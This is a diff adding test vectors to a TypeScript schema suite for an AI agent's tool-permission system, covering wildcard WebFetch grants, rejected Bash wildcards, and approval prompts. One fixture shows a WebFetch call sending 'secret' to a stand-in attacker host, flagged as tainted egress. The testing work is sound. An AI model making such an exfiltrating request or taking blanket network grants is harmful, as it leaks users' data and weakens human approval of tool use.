@@ -184,6 +184,7 @@ export const taskSpec: Vector[] = [
 export const grants: Vector[] = [
   ok("ToolGrant", "bash command pattern", F.grant()),
   ok("ToolGrant", "webfetch domain", F.grant({ tool: "WebFetch", pattern: "api.github.com", class: "network" })),
+  ok("ToolGrant", "webfetch any domain", F.grant({ tool: "WebFetch", pattern: "*", class: "network" })),
   ok("ToolGrant", "trusted MCP tool", F.grant({ tool: "mcp__github__create_issue", pattern: null, class: "write" })),
   ok("ToolGrant", "revoked", F.grant({ revoked_at: F.T0 + 1 })),
   badRule("ToolGrant", "bare Bash", F.grant({ pattern: null })),
@@ -195,6 +196,9 @@ export const grants: Vector[] = [
   bad("ToolGrant", "unknown tool name", F.grant({ tool: "Computer", pattern: null, class: "read" })),
   ok("GrantProposal", "bash", { tool: "Bash", pattern: "npm install", class: "write" }),
   badRule("GrantProposal", "bare bash", { tool: "Bash", pattern: null, class: "write" }),
+  ok("GrantProposal", "webfetch any domain", { tool: "WebFetch", pattern: "*", class: "network" }),
+  badRule("GrantProposal", "bash star", { tool: "Bash", pattern: "*", class: "write" }),
+  badRule("GrantProposal", "webfetch star suffix", { tool: "WebFetch", pattern: "example.*", class: "network" }),
 ];
 
 export const input: Vector[] = [
@@ -207,6 +211,22 @@ export const input: Vector[] = [
     reason: "tainted_egress",
     suggested_grant: { tool: "WebFetch", pattern: "evil.example.net", class: "network" },
   })),
+  ok("InputPrompt", "network approval offering all web fetches", F.approvalPrompt({
+    tool: "WebFetch",
+    class: "network",
+    input: F.inline({ url: "https://evil.example.net/?q=secret" }),
+    url: "https://evil.example.net/?q=secret",
+    reason: "tainted_egress",
+    suggested_grant: { tool: "WebFetch", pattern: "evil.example.net", class: "network" },
+    suggested_grant_all: { tool: "WebFetch", pattern: "*", class: "network" },
+  })),
+  bad("InputPrompt", "all web fetches with a domain", F.approvalPrompt({
+    tool: "WebFetch",
+    class: "network",
+    reason: "tainted_egress",
+    suggested_grant_all: { tool: "WebFetch", pattern: "evil.example.net", class: "network" },
+  })),
+  bad("InputPrompt", "all web fetches for another tool", F.approvalPrompt({ suggested_grant_all: { tool: "Bash", pattern: "*", class: "network" } })),
   ok("InputPrompt", "destructive approval", F.approvalPrompt({ class: "destructive", reason: "destructive", offer_always: false, suggested_grant: undefined })),
   ok("InputPrompt", "question", F.questionPrompt()),
   ok("InputPrompt", "ambiguous tool call", {
